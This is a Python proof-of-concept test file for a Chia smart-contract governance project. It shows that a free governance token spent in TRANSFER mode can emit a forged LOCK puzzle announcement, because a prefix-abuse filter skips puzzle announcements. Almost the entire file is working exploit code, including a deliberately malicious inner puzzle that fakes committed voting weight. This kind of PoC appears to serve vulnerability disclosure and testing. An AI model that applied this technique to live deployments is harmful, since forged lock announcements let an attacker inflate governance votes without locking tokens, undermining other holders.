"""PoC: PGT TRANSFER mode can spoof a governance LOCK announcement.

Run:
    PYTHONPATH=. .venv/bin/python tests/poc_pgt_lock_announcement_spoof.py

Expected vulnerable output:
    forged_lock_announcement_present=True
    create_coin_count=1

The proposal tracker treats a PGT LOCK announcement as proof that governance
weight was committed. This PoC shows a PGT free coin can emit that same
announcement while spending in TRANSFER mode, so the PGT remains free instead
of moving into pgt_locked_inner.
"""
from __future__ import annotations

from chia.types.blockchain_format.program import Program
from chia_rs.sized_bytes import bytes32

from populis_puzzles.pgt_driver import (
    PGT_TRANSFER,
    SINGLETON_LAUNCHER_HASH,
    make_proposal_tracker_struct,
    pgt_free_inner_mod,
    pgt_free_inner_puzzle,
    pgt_locked_inner_mod,
)


CREATE_COIN = 51
CREATE_PUZZLE_ANNOUNCEMENT = 62
PROTOCOL_PREFIX = b"\x50"
LOCK_TAG = b"LOCK"


def main() -> None:
    singleton_mod_hash = bytes32(b"\x01" * 32)
    tracker_launcher_id = bytes32(b"\xb0" * 32)
    tracker_struct = make_proposal_tracker_struct(
        singleton_mod_hash,
        tracker_launcher_id,
        SINGLETON_LAUNCHER_HASH,
    )

    pgt_locked_mod_hash = bytes32(pgt_locked_inner_mod().get_tree_hash())
    pgt_free_mod_hash = bytes32(pgt_free_inner_mod().get_tree_hash())

    proposal_hash = bytes32(b"\xee" * 32)
    amount = 600_000
    deadline = 2_000_000_000

    owner_inner = Program.to((1, []))
    owner_hash = bytes32(owner_inner.get_tree_hash())
    lock_content = PROTOCOL_PREFIX + Program.to(
        [LOCK_TAG, proposal_hash, amount, deadline]
    ).get_tree_hash()

    # The malicious owner inner emits exactly one CREATE_COIN, so TRANSFER mode
    # passes, plus a protocol-prefixed LOCK announcement. The current
    # check_no_protocol_prefix_abuse() filter does not reject puzzle
    # announcements.
    malicious_inner = Program.to(
        (
            1,
            [
                [CREATE_COIN, owner_hash, amount],
                [CREATE_PUZZLE_ANNOUNCEMENT, lock_content],
            ],
        )
    )

    pgt_free = pgt_free_inner_puzzle(
        pgt_locked_mod_hash,
        tracker_struct,
        bytes32(malicious_inner.get_tree_hash()),
    )
    out = pgt_free.run(Program.to([PGT_TRANSFER, malicious_inner, 0, 0])).as_python()

    forged_lock = any(
        c[0] == bytes([CREATE_PUZZLE_ANNOUNCEMENT]) and c[1] == lock_content
        for c in out
    )
    create_coin_count = sum(1 for c in out if c[0] == bytes([CREATE_COIN]))

    print("PGT LOCK announcement spoof PoC")
    print("-" * 72)
    print(f"pgt_free_mod_hash={pgt_free_mod_hash.hex()}")
    print(f"proposal_hash={proposal_hash.hex()}")
    print(f"lock_content={lock_content.hex()}")
    print(f"forged_lock_announcement_present={forged_lock}")
    print(f"create_coin_count={create_coin_count}")
    print()
    print("Emitted conditions:")
    for condition in out:
        print(condition)


if __name__ == "__main__":
    main()
